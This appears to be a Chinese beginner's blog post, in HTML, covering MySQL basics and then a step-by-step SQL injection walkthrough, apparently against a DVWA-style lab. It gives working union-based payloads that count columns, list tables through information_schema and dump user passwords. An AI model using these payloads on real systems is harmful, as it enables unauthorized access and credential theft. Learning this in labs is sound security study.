@@ -1,0 +1,264 @@
+<!DOCTYPE HTML>
+<html>
+
+<head>
+	<link rel="bookmark"  type="image/x-icon"  href="/img/logo_miccall.png"/>
+	<link rel="shortcut icon" href="/img/logo_miccall.png">
+	
+			    <title>
+    NYQX
+    </title>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
+    <link rel="stylesheet" href="/css/mic_main.css" />
+    <link rel="stylesheet" href="/css/dropdownMenu.css" />
+    <meta name="keywords" content="NYQX" />
+    
+    	<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+	 
+    <noscript>
+        <link rel="stylesheet" href="/css/noscript.css" />
+    </noscript>
+    <style type="text/css">
+        body:before {
+          content: ' ';
+          position: fixed;
+          top: 0;
+          background: url('/img/bg.jpg') center 0 no-repeat;
+          right: 0;
+          bottom: 0;
+          left: 0;
+          background-size: cover; 
+        }
+    </style>
+
+			    
+  
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script async type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
+  
+
+
+    <script src="/js/jquery.min.js"></script>
+    <script src="/js/jquery.scrollex.min.js"></script>
+    <script src="/js/jquery.scrolly.min.js"></script>
+    <script src="/js/skel.min.js"></script>
+    <script src="/js/util.js"></script>
+    <script src="/js/main.js"></script>
+	
+</head>
+    
+		
+<!-- Layouts -->
+
+
+
+<!--  代码渲染  -->
+<link rel="stylesheet" href="/css/prism_coy.css" />
+<link rel="stylesheet" href="/css/typo.css" />
+<!-- 文章页 -->
+<body class="is-loading">
+    <!-- Wrapper 外包 s-->
+    <div id="wrapper" class="fade-in">
+        <!-- Intro 头部显示 s -->
+        <!-- Intro 头部显示 e -->
+        <!-- Header 头部logo start -->
+        <header id="header">
+    <a href="/" class="logo">Ting</a>
+</header>
+        <!-- Nav 导航条 start -->
+        <nav id="nav" class="special" >
+            <ul class="menu links" >
+			<!-- Homepage  主页  --> 
+			<li >
+	            <a href="/" rel="nofollow">主页</a>
+	        </li>
+			<!-- categories_name  分类   --> 
+	        
+	        <li class="active">
+	            <a href="#s1">分类</a>
+	                    <ul class="submenu">
+	                        <li>
+	                        
+	                    </ul>
+	        </li>
+	        
+	        <!-- archives  归档   --> 
+	        
+	        
+		        <!-- Pages 自定义   -->
+		        
+		        <li>
+		            <a href="/gallery/" title="图库">
+		                图库
+		            </a>
+		        </li>
+		        
+		        <li>
+		            <a href="/tag/" title="标签">
+		                标签
+		            </a>
+		        </li>
+		        
+
+
+            </ul>
+            <!-- icons 图标   -->
+			<ul class="icons">
+                    
+                    <li>
+                        <a title="github" href="https://github.com/miccall" target="_blank" rel="noopener">
+                            <i class="icon fa fa-github"></i>
+                        </a>
+                    </li>
+                    
+                    <li>
+                        <a title="500px" href="http://500px.com" target="_blank" rel="noopener">
+                            <i class="icon fa fa-500px"></i>
+                        </a>
+                    </li>
+                    
+			</ul>
+</nav>
+
+        <div id="main" >
+            <div class ="post_page_title_img" style="height: 25rem;background-image: url(小埋.jpg);background-position: center; background-repeat:no-repeat; background-size:cover;-moz-background-size:cover;overflow:hidden;" >
+                <a href="#" style="padding: 4rem 4rem 2rem 4rem ;"><h2 >初见SQL</h2></a>
+            </div>
+            <!-- Post -->
+            <div class="typo" style="padding: 3rem;">
+                <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>&emsp;&emsp;我是nyqx，我现在慌得一匹。<br>&emsp;&emsp;我不是天生要强，我是注定要凉。  </p>
+<p><img src="/2018/07/05/SQL1/1.jpg" alt=".."><br><br><br><br></p>
+<hr>
+<p><br></p>
+<h3 id="0、理论基础"><a href="#0、理论基础" class="headerlink" title="0、理论基础"></a>0、理论基础</h3><p>&emsp;&emsp;<strong>数据库(Database)：</strong>是按照数据结构来组织、存储和管理数据的建立在计算机存储设备上的仓库。严格来说，数据库是长期储存在计算机内、有组织的、可共享的数据集合。</p>
+<blockquote>
+<p>数据库是相关数据的集合，一个数据库含有各种成分，包括<em>数据表、记录、字段、索引</em>等.</p>
+<blockquote>
+<p><em>数据表(Table):</em><br>简称表，由一组数据记录组成，数据库中的数据是以表为单位进行组织的。一个表是一组相关的按行排列的数据；每个表中都含有相同类型的信息。表实际上是一个二维表格，例如，一个班所有学生的考试成绩，可以存放在一个表中，表中的每一行对应一个学生，这一行包括学生的学号，姓名及各门课程成绩。<br><em>记录(Record):</em><br>表中的每一行称为一个记录，它由若干个字段组成。<br><em>字段(Field):</em><br>也称域。表中的每一列称为一个字段。每个字段都有相应的描述信息，如数据类型、数据宽度等。<br><em>索引(Index):</em><br>为了提高访问数据库的效率，可以对数据库使用索引。当数据库较大时，为了查找指定的记录，则使用索引和不使用索引的效率有很大差别。索引实际上是一种特殊类型的表，其中含有关键字段的值(由用户定义)和指向实际记录位置的指针，这些值和指针按照特定的顺序(也由用户定义)存储，从而可以以较快的速度查找到所需要的数据记录。</p>
+</blockquote>
+</blockquote>
+<p>&emsp;&emsp;<strong>SQL：</strong>结构化查询语言(Structured Query Language)，是一种特殊目的的编程语言，是一种数据库查询和程序设计语言，用于存取数据以及查询、更新和管理关系数据库系统；同时也是数据库脚本文件的扩展名。<br>&emsp;&emsp;<strong>MySQL：</strong>MySQL是一种关系数据库管理系统，关系数据库将数据保存在不同的表中，而不是将所有数据放在一个大仓库内，这样就增加了速度并提高了灵活性。由于其社区版的性能卓越，搭配 PHP 和 Apache 可组成良好的开发环境。</p>
+<hr>
+<p><br></p>
+<h3 id="1、MySQL初学使用"><a href="#1、MySQL初学使用" class="headerlink" title="1、MySQL初学使用"></a>1、MySQL初学使用</h3><h4 id="1-、连接MySQL"><a href="#1-、连接MySQL" class="headerlink" title="(1)、连接MySQL"></a>(1)、连接MySQL</h4><p>(Linux下启动mysql：<em>service mysql start</em>)</p>
+<blockquote>
+<p><strong>格式：</strong> <em>mysql -h 主机地址 -u 用户名 －p 用户密码</em></p>
+<blockquote>
+<p><em>01.</em>例1：连接到本机上的MYSQL。<br>首先在打开 DOS 窗口，然后进入目录 mysqlbin，再键入命令：<br>&emsp;&emsp;<em>mysql -uroot -p;</em><br>回车后提示你输密码，如果刚安装好MYSQL，超级用户root 是没有密码的，故直接回车即可进入到 MySQL 中了，MySQL 的提示符是：mysql&gt;<br><em>02.</em>例2：连接到远程主机上的MYSQL。假设远程主机的IP为：110.110.110.110，用户名为root,密码为abcd123。则键入以下命令：<br>&emsp;&emsp;<em>mysql -h110.110.110.110 -uroot -pabcd123;</em><br>注：u与root可以不用加空格，其它也一样.<br><em>03.</em>退出 MySQL 命令：<br>&emsp;&emsp;<em>exit;</em></p>
+</blockquote>
+</blockquote>
+<h4 id="2-、修改密码"><a href="#2-、修改密码" class="headerlink" title="(2)、修改密码"></a>(2)、修改密码</h4><blockquote>
+<p><strong>格式1：</strong> <em>mysqladmin -u用户名 -p旧密码 password 新密码</em>  </p>
+<blockquote>
+<p><em>01.</em>例1：给root加个密码ab12。首先在DOS下进入目录mysqlbin，然后键入以下命令<br>&emsp;&emsp;<em>mysqladmin -uroot -password ab12;</em><br>注：因为开始时root没有密码，所以-p旧密码一项就可以省略了。<br><em>02.</em>例2：再将root的密码改为djg345。<br>&emsp;&emsp;<em>mysqladmin -uroot -pab12 password djg345;</em></p>
+</blockquote>
+</blockquote>
+<blockquote>
+<p><strong>格式2：</strong><br>&emsp;&emsp;<em>update mysql.user set password=password(‘test’) where username=’root’;</em><br>&emsp;&emsp;<em>flush privileges;</em></p>
+</blockquote>
+<h4 id="3-、显示命令"><a href="#3-、显示命令" class="headerlink" title="(3)、显示命令"></a>(3)、显示命令</h4><blockquote>
+<p><em>01.</em>显示数据库列表：<br>&emsp;&emsp;<em>show databases;</em><br>刚开始时才两个数据库：mysql 和 test。mysql 库很重要它里面有 MySQL 的系统信息，我们改密码和新增用户，实际上就是用这个库进行操作。<br><em>02.</em>显示库中的数据表：<br>&emsp;&emsp;<em>use 数据库名；</em> //进入库<br>&emsp;&emsp;<em>show tables;</em><br><em>03.</em>显示数据表的结构：<br>&emsp;&emsp;<em>describe 表名；</em><br><em>04.</em>建库：<br>&emsp;&emsp;<em>create database 库名；</em><br><em>05.</em>建表：<br>&emsp;&emsp;<em>use “库名”；</em><br>&emsp;&emsp;<em>create table 表名(字段设定列表)；</em><br><em>例：</em>创建表名为users的数据表,字段分别为id(int),username(varchar(20)),password(varchar(50))，id自增：<br>&emsp;&emsp;<em>create table users(id int auto_increment,username varchar(20),password varchar(50));</em><br><em>06.</em>删库和删表：<br>&emsp;&emsp;<em>drop database 库名；</em><br>&emsp;&emsp;<em>drop table 表名；</em><br><em>07.</em>将表中记录清空：<br>&emsp;&emsp;<em>delete from 表名；</em><br><em>08.</em>显示表中的记录：<br>&emsp;&emsp;<em>select * from 表名；</em><br><em>09.</em>显示最后一个执行的语句所产生的错误、警告和通知：<br>&emsp;&emsp;<em>show warnings;</em><br><em>10.</em>只显示最后一个执行语句所产生的错误：<br>&emsp;&emsp;<em>show errors;</em><br><em>11.</em>查看表：<br>&emsp;&emsp;<em>desc users;</em><br><em>12.</em>修改表名：<br>&emsp;&emsp;<em>alter table user rename to bbb;</em><br><em>13</em>插入数据：<br>&emsp;&emsp;<em>insert into users (username,password) values(“zz”,”zz_is_handsome”);</em><br><em>14</em>删除数据：<br>&emsp;&emsp;<em>delete from users where username=’zz’;</em><br><em>15</em>修改数据：<br>&emsp;&emsp;<em>update users set username=’ZZ’ where id=0;</em><br><em>16.</em>修改表的列：</p>
+<blockquote>
+<p>加列age(int)：<br>&emsp;&emsp;<em>alter table users add column age int;</em><br>删除列age：<br>&emsp;&emsp;<em>alert table users drop column age</em><br>修改列属性：<br>&emsp;&emsp;<em>alter table users modify age char(10);</em><br>删除id自增长：<br>&emsp;&emsp;<em>alter table users change id id int;</em><br>删除主键：<br>&emsp;&emsp;<em>alter table users drop primary key;</em><br>修改字段age为不为空：<br>&emsp;&emsp;<em>alter table users change age age not null;</em><br>添加id为主键，自增长：<br>&emsp;&emsp;<em>alter table users modify id int auto_increment primary key;</em><br>设置id默认为0：<br>&emsp;&emsp;<em>alter table users modify id int default 0;</em></p>
+</blockquote>
+</blockquote>
+<blockquote>
+<p><em>17</em>导入导出(windows)：</p>
+<blockquote>
+<p>1.导出整个数据库:<br>&emsp;&emsp;<em>mysqldump -u 用户名 -p 数据库名 &gt; 导出的文件名；</em><br>&emsp;&emsp;<em>mysqldump -u dbuser -p dbname &gt; dbname.sql；</em><br>2.导出一个表:<br>&emsp;&emsp;<em>mysqldump -u 用户名 -p 数据库名 表名&gt; 导出的文件名</em><br>&emsp;&emsp;<em>mysqldump -u dbuser -p dbname users&gt; dbname_users.sql；</em><br>3.导出一个数据库结构:<br>&emsp;&emsp;<em>mysqldump -u dbuser -p -d –add-drop-table dbname &gt;d:/dbname_db.sql；</em><br>4.导入数据库:<br>常用source命令<br>进入mysql数据库控制台，如:<br>&emsp;&emsp;<em>mysql -u root -p；</em><br>&emsp;&emsp;<em>use 数据库名</em><br>然后使用source命令，后面参数为脚本文件(如这里用到的.sql):<br>&emsp;&emsp;<em>source d:/dbname.sql；</em><br>5.导入数据到数据库<br>&emsp;&emsp;<em>mysql -uroot -D数据库名；</em><br>6.导入数据到数据库中得某个表<br>&emsp;&emsp;<em>mysql -uroot -D数据库名  表名；</em></p>
+</blockquote>
+</blockquote>
+<blockquote>
+<p><em>18.</em>附加命令：<br><em>union select:</em>联合查询，即前一条查询语句失败后执行后一条语句。<br><em>group by:**后接数字，表示按照第几列进行排序。
+</em>group_concat:*将查询结果以一行的形式输出.</p>
+</blockquote>
+<p><strong>注意：</strong>如果你打命令时，回车后发现忘记加分号，你无须重打一遍命令，只要打个分号回车就可以了。</p>
+<h4 id="4-连接操作符"><a href="#4-连接操作符" class="headerlink" title="(4)连接操作符"></a>(4)连接操作符</h4><p>在一个SQL语句里用多个不同的操作符进行多种比较，常用于  WHERE子句中。<br><strong>AND：</strong>所有由AND连接的条件都为TRUE，SQL语句才会执行。<br><strong>OR：</strong>只要OR连接的条件里有一个是TRUE，SQL语句就会执行。</p>
+<hr>
+<p><br></p>
+<h3 id="2、SQL简单注入"><a href="#2、SQL简单注入" class="headerlink" title="2、SQL简单注入"></a>2、SQL简单注入</h3><p>&emsp;&emsp;所谓SQL注入，就是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。</p>
+<h4 id="1-、注入点类型"><a href="#1-、注入点类型" class="headerlink" title="(1)、注入点类型"></a>(1)、注入点类型</h4><blockquote>
+<p><em>01.数字型注入点</em><br>形如“http://?ID=55”，这类注入的参数是“数字”，因此称为 <em>数字型注入点</em>。<br>此类注入点提交的SQL语句，其原形大致为：<br><em>Select * from 表名 where 字段=55</em><br>当我们提交注入参数为“http://?ID=55 And[查询条件]”时，向数据库提交的完整 SQL 语句为：<br><em>Select * from 表名 where 字段=55 And [查询条件]</em></p>
+</blockquote>
+<blockquote>
+<p><em>02.字符型注入点</em><br>形如“http://?Class=日期”这类注入的参数是“字符”，因此称为 <em>字符型注入点</em>。<br>此类注入点提交的 SQL 语句，其原形大致为：<br><em>select * from 表名 where 字段=’日期’</em><br>当我们提交注入参数为“<a href="http://Class=日期" target="_blank" rel="noopener">http://Class=日期</a> And[查询条件]时，向数据库提交的完整 SQL 语句为”：<br><em>select * from 表名 where 字段=’日期’ and [查询条件]</em></p>
+</blockquote>
+<blockquote>
+<p><em>03.搜索型注入点</em><br>这是一类特殊的注入类型。这类注入主要是指在进行数据搜索时没过滤搜索参数，一般在链接地址中有“keyword=关键字”，有的不显示的链接地址，而是直接通过搜索框表单提交。<br>此类注入点提交的 SQL 语句，其原形大致为：<br><em>select * from 表名 where 字段 like ‘%关键字%’</em><br>当我们提交注入参数为“keyword=’and[查询条件] and ‘%’=’,则向数据库提交的完事SQL语句为：<br><em>select * from 表名 where 字段 like ‘%’ and [查询条件] and ‘%’=’%’</em></p>
+</blockquote>
+<h4 id="2-、操作步骤："><a href="#2-、操作步骤：" class="headerlink" title="(2)、操作步骤："></a>(2)、操作步骤：</h4><h5 id="1-gt-判断是否存在注入，注入是字符型还是数字型"><a href="#1-gt-判断是否存在注入，注入是字符型还是数字型" class="headerlink" title="1&gt;判断是否存在注入，注入是字符型还是数字型"></a>1&gt;判断是否存在注入，注入是字符型还是数字型</h5><p><strong>例：</strong><br>输入<em>1</em>，查询成功;<br>输入<em>1’ and ‘1’ =’2</em>，查询失败，返回结果为空;<br>输入<em>1’or ‘1 ’=’1</em>，查询成功;<br>返回了多个结果，说明存在字符型注入。<br>如图：<br><img src="/2018/07/05/SQL1/SQL!/7.jpg" alt="7"></p>
+<h5 id="2-gt-猜解SQL查询语句中的字段数"><a href="#2-gt-猜解SQL查询语句中的字段数" class="headerlink" title="2&gt;猜解SQL查询语句中的字段数"></a>2&gt;猜解SQL查询语句中的字段数</h5><p><strong>例：</strong><br>输入<em>1’ or 1=1 order by 1 #</em>，查询成功;<br>输入<em>1’ or 1=1 order by 2 #</em>，查询成功;<br>输入<em>1’ or 1=1 order by 3 #</em>，查询失败;<br>说明执行的SQL查询语句中只有两个字段。</p>
+<h5 id="3-gt-确定显示的字段顺序"><a href="#3-gt-确定显示的字段顺序" class="headerlink" title="3&gt;确定显示的字段顺序"></a>3&gt;确定显示的字段顺序</h5><p>输入<em>1’union select 1,2 #</em>，查询成功;<br>如图：<br><img src="/2018/07/05/SQL1/2.jpg" alt="2"></p>
+<h5 id="4-gt-获取当前数据库"><a href="#4-gt-获取当前数据库" class="headerlink" title="4&gt;获取当前数据库"></a>4&gt;获取当前数据库</h5><p>输入<em>1′ union select 1,database() #</em>，查询成功;<br>如图：<br><img src="/2018/07/05/SQL1/3.jpg" alt="3"></p>
+<h5 id="5-gt-获取数据库中的表"><a href="#5-gt-获取数据库中的表" class="headerlink" title="5&gt;获取数据库中的表"></a>5&gt;获取数据库中的表</h5><p>输入<em>1′ union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #</em>，查询成功;<br>如图：<br><img src="/2018/07/05/SQL1/4.jpg" alt="4"></p>
+<h5 id="6-gt-获取表中的字段名"><a href="#6-gt-获取表中的字段名" class="headerlink" title="6&gt;获取表中的字段名"></a>6&gt;获取表中的字段名</h5><p>输入<em>1′ union select 1,group_concat(column_name) from information_schema.columns where table_name=’users’ #</em>，查询成功;<br>如图：<br><img src="/2018/07/05/SQL1/5.jpg" alt="5"><br><em>#</em><br>Information_schema.tables:包含所有数据表名<br>Information_schema.columns:包含所有字段<br>table_schema字段表示数据库名<br>table_name字段表示数据表名<br>column_name字段表示列名</p>
+<h5 id="7-gt-下载数据"><a href="#7-gt-下载数据" class="headerlink" title="7&gt;下载数据"></a>7&gt;下载数据</h5><p>输入<em>1′ or 1=1 union select group_concat(id,first_name,last_name),group_concat(password) from users #</em>，查询成功;<br>如图：<br><img src="/2018/07/05/SQL1/6.jpg" alt="6"></p>
+<hr>
+<p><br></p>
+<h3 id="╹▽╹"><a href="#╹▽╹" class="headerlink" title="(*╹▽╹*)"></a>(*╹▽╹*)</h3><h2 id="小埋镇楼！"><a href="#小埋镇楼！" class="headerlink" title="小埋镇楼！"></a>小埋镇楼！</h2><p><img src="/2018/07/05/SQL1/干物妹.jpg" alt="小埋"></p>
+
+            </div>
+
+            <!-- Post Comments -->
+            
+    <!-- 使用 valine -->
+<div id="comment">
+    <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+    <script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+<script>
+    new Valine({
+        el: '#comment' ,
+        notify: true,
+        verify: false,
+        app_id: 'your appId',
+        app_key: 'your appkey',
+        placeholder: 'Please leave your footprints',
+        pageSize: '10',
+        avatar: '',
+        avatar_cdn: 'https://gravatar.loli.net/avatar/'
+    });
+</script>
+</div>
+<style>
+   #comment{
+        padding: 2pc;
+    }
+</style>
+
+
+        </div>
+        <!-- Copyright 版权 start -->
+                <div id="copyright">
+            <ul>
+                <li>&copy;Powered By <a href="https://hexo.io/zh-cn/" style="border-bottom: none;">hexo</a></li>
+                <li>Design: <a href="http://miccall.tech " style="border-bottom: none;">miccall</a></li>
+            </ul>
+            
+            	<span id="busuanzi_container_site_pv">2018总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+			
+        </div>
+    </div>
+</body>
+
+
+
+ 	
+</html>
